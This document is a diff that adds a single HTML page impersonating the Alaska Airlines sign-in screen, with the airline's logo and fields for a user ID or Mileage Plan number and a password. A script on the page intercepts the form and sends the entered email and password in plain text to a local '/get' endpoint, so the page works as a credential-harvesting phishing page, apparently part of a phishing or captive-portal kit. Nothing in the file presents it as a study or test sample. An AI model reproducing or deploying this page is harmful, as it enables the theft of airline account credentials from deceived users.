@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.1);
+        }
+        .login-container h1, .login-container h2 {
+            text-align: center;
+        }
+        .login-container button {
+            width: 100%;
+            background-color: green;
+        }
+        #logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 10px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+    </style>
+    <script>
+        window.addEventListener('DOMContentLoaded', (event) => {
+            const form = document.getElementById('email-form-step');
+            form.addEventListener('submit', (event) => {
+                event.preventDefault();
+                const emailInput = document.getElementById('email-input');
+                const passwordInput = document.getElementById('password-input');
+                const email = emailInput.value;
+                const password = passwordInput.value;
+                const url = `/get?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
+                window.location.href = url;
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-4 offset-lg-4 login-container">
+                <div id="logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 301 92" width="93.75" height="30">
+                      <g fill="#00385f">
+                        <path d="m148 4-35 58c-3 5-5 11-6 17H94c1-7 4-14 10-24l23-40c5-8 10-11 19-11h2zm10 31c-18 0-28 10-38 32-2 6-4 13 5 13 4 0 12-3 17-7v6h12c0-5 2-11 6-18l15-25-17-1m-13 29c-3 3-7 6-11 6-3 0-3-3-2-6 8-14 15-21 25-21h1l-13 21zm138-29c-17 0-28 10-37 32-3 6-4 13 4 13 4 0 12-3 17-7v6h12c1-5 2-11 6-18l15-25-17-1m-13 29c-2 3-7 6-11 6-3 0-3-3-1-6 7-14 15-21 24-21h2l-14 21z"/>
+                        <path d="M243 91h-4c-5 0-9-3-11-8l-6-23-11 19h-13l36-61c5-8 10-11 18-11h2l-24 41 18-13h14l-30 21 11 35zM124 1c-12 0-19 3-31 11L53 42H27c-8 0-14 0-19 4l-6 7 37-2L0 79h17l40-28 13-1c9 0 15-8 15-8H69l32-24-23 39c-5 9-8 15-9 22h14l6-18 33-54 4-6h-2zm64 46c0 2 1 2 3 4l4 2c4 3 5 7 5 10-1 9-8 17-22 17l-17-2 6-9 12 1c5 0 7-2 7-4 1-1 0-3-2-4l-3-3c-5-3-6-6-6-10 1-8 11-14 24-14l13 1-5 9-12-1c-4 0-6 1-7 3"/>
+                      </g>
+                    </svg>
+                </div>
+                <form id="email-form-step">
+                    <h1>Sign in</h1>
+                    <h2>Use your Alaska Airlines Account</h2>
+                    <div class="form-group">
+                        <input id="email-input" name="email" type="text" class="form-control" placeholder="User ID or Mileage Plan number" required>
+                    </div>
+                    <div class="form-group">
+                        <input id="password-input" name="password" type="password" class="form-control" placeholder="Password" required>
+                    </div>
+                    <div class="form-group">
+                        <button class="btn btn-primary" type="submit">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
